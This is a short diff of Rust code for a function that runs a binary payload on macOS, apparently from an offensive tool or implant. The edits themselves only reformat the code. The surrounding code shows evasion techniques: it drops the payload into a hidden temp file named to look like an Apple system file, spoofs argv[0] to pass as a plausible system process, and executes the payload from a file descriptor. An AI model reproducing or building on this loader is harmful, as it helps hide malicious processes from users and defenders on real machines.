@@ -157,7 +157,7 @@ fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
 fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
     use std::ffi::CString;
     use std::io::Write;
-    use std::os::unix::io::{IntoRawFd, FromRawFd};
+    use std::os::unix::io::{FromRawFd, IntoRawFd};
 
     // macOS does not have memfd_create, but fexecve(2) is available since
     // macOS 10.14.  Strategy:
@@ -178,7 +178,9 @@ fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
     let tmp_name = format!(".com.apple.{}", std::process::id());
     let tmp_path = tmp_dir.join(&tmp_name);
     let tmp_c = CString::new(
-        tmp_path.to_str().ok_or_else(|| anyhow!("non-UTF8 temp path"))?,
+        tmp_path
+            .to_str()
+            .ok_or_else(|| anyhow!("non-UTF8 temp path"))?,
     )?;
 
     let fd = unsafe {
@@ -209,10 +211,7 @@ fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
 
     // Seek back to offset 0 for exec.
     if unsafe { libc::lseek(fd, 0, libc::SEEK_SET) } == -1 {
-        return Err(anyhow!(
-            "lseek failed: {}",
-            std::io::Error::last_os_error()
-        ));
+        return Err(anyhow!("lseek failed: {}", std::io::Error::last_os_error()));
     }
 
     // Build argv — spoof argv[0] as a plausible system process.
@@ -230,7 +229,8 @@ fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
         .collect();
 
     // Build a clean envp to avoid leaking secrets.
-    let path_var = CString::new("PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin").unwrap();
+    let path_var =
+        CString::new("PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin").unwrap();
     let envp: Vec<*const libc::c_char> = vec![path_var.as_ptr(), std::ptr::null()];
 
     #[cfg(debug_assertions)]
